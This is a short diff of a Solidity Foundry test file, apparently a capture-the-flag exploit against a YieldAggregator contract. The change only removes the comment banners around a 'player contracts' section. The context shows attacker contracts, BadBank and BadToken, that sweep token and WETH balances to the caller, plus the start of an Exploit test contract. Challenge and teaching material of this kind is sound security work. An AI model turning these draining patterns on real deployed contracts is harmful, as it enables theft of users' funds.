@@ -35,9 +35,6 @@ interface WETH9 is ERC20Like {
     function deposit() external payable;
 }
 
-//======================================================================================
-//=======================VVVVVVPLAYER CONTRACTSVVVVVV===================================
-//======================================================================================
 contract BadBank is MiniBank {
     function flush(ERC20Like token) external {
         token.transfer(msg.sender, token.balanceOf(address(this)));
@@ -96,10 +93,6 @@ contract BadToken {
         weth.transfer(msg.sender, weth.balanceOf(address(this)));
     }
 }
-
-//======================================================================================
-//=======================^^^^^^PLAYER CONTRACTS^^^^^^===================================
-//======================================================================================
 
 contract Exploit is Test {
     YieldAggregator public aggregator;
